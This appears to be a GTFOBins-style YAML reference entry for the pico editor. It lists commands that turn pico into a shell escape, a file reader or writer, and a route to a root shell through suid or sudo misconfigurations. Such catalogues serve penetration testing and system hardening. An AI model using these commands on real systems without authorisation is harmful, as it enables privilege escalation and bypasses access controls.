---
functions:
  shell:
    - code: |
        TF=$(mktemp)
        echo 'exec sh' > $TF
        chmod +x $TF
        pico -s $TF /etc/hosts
        ^T 
    - description: If ``Unknown error`` is provided on `^T`, you can try:
      code: |
        TF=$(mktemp)
        echo 'exec sh' > $TF
        chmod +x $TF
        pico -s $TF /etc/hosts
        ^R ^X /bin/sh
  file-write:
    - code: |
        pico file_to_write
        DATA
        ^O
  file-read:
    - code: pico file_to_read
  suid:
    - code: |
        TF=$(mktemp)
        echo 'exec sh -p' > $TF
        chmod +x $TF
        ./pico -s $TF /etc/hosts
        ^T
  sudo:
    - code: |
        TF=$(mktemp)
        echo 'exec sh' > $TF
        chmod +x $TF
        sudo pico -s $TF /etc/hosts
        ^T
---
